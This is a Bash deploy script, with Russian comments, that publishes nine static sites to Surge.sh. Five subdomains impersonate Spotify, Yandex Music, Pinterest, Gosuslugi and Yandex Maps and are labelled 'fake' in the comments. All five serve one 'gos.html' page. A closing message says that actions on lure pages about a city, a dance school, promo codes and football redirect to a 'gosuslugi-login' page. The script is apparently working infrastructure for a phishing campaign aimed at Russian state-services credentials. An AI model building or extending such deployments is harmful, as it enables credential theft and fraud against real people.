#!/bin/bash
# Удобный скрипт для деплоя на Surge.sh
# Использование: ./deploy.sh

set -e

echo "🚀 Подготовка и деплой сайта на Surge.sh"
echo "=========================================="

cd "$(dirname "$0")" || exit 1

# Автоматически применяем настройки из config.json (в т.ч. номер телефона)
if command -v python3 >/dev/null 2>&1 && [ -f "apply_config.py" ]; then
    echo "→ Применяем настройки из config.json..."
    python3 apply_config.py
fi

echo "Папка: $(pwd)"
echo ""

# === Подготовка отдельных доменов (каждый slug = отдельный сайт на Surge) ===
echo "→ Подготавливаем папки для отдельных доменов..."

mkdir -p \
  open-spotifycom-intl-f-artist \
  music-yandex-ru-artist \
  ru-pinteres-com-pin \
  gosuslugi-login \
  yandex-maps-ru \
  city-geo \
  dance-scool \
  promo-code \
  footbal-ru

# "фейковые" домены — чистый gos.html на корне
cp gos.html open-spotifycom-intl-f-artist/index.html
cp gos.html music-yandex-ru-artist/index.html
cp gos.html ru-pinteres-com-pin/index.html
cp gos.html gosuslugi-login/index.html
cp gos.html yandex-maps-ru/index.html

# Остальные домены — свои оригинальные страницы
cp city.html city-geo/index.html
cp dance_scool.html dance-scool/index.html
cp promocode.html promo-code/index.html
cp football.html footbal-ru/index.html

echo "   ✓ open-spotifycom-intl-f-artist (gos.html)"
echo "   ✓ music-yandex-ru-artist (gos.html)"
echo "   ✓ ru-pinteres-com-pin (gos.html)"
echo "   ✓ gosuslugi-login (gos.html)"
echo "   ✓ yandex-maps-ru (gos.html)"
echo "   ✓ city-geo (city.html)"
echo "   ✓ dance-scool (dance_scool.html)"
echo "   ✓ promo-code (promocode.html)"
echo "   ✓ footbal-ru (football.html)"
echo ""

# === Деплой каждого домена отдельно ===
echo "→ Публикуем все домены на Surge..."

surge open-spotifycom-intl-f-artist open-spotifycom-intl-f-artist.surge.sh
surge music-yandex-ru-artist music-yandex-ru-artist.surge.sh
surge ru-pinteres-com-pin ru-pinteres-com-pin.surge.sh
surge gosuslugi-login gosuslugi-login.surge.sh
surge yandex-maps-ru yandex-maps-ru.surge.sh
surge city-geo city-geo.surge.sh
surge dance-scool dance-scool.surge.sh
surge promo-code promo-code.surge.sh
surge footbal-ru footbal-ru.surge.sh

echo ""
echo "✅ Готово! Все ссылки:"
echo "  https://open-spotifycom-intl-f-artist.surge.sh (gos.html)"
echo "  https://music-yandex-ru-artist.surge.sh (gos.html)"
echo "  https://ru-pinteres-com-pin.surge.sh (gos.html)"
echo "  https://gosuslugi-login.surge.sh (gos.html)"
echo "  https://yandex-maps-ru.surge.sh (gos.html)"
echo "  https://city-geo.surge.sh (city.html)"
echo "  https://dance-scool.surge.sh (dance_scool.html)"
echo "  https://promo-code.surge.sh (promocode.html)"
echo "  https://footbal-ru.surge.sh (football.html)"
echo ""
echo "После действий на city/dance/promo/footbal страницах происходит редирект на gos.html (https://gosuslugi-login.surge.sh)"
echo ""
echo "Для обновления: просто запускай ./deploy.sh снова"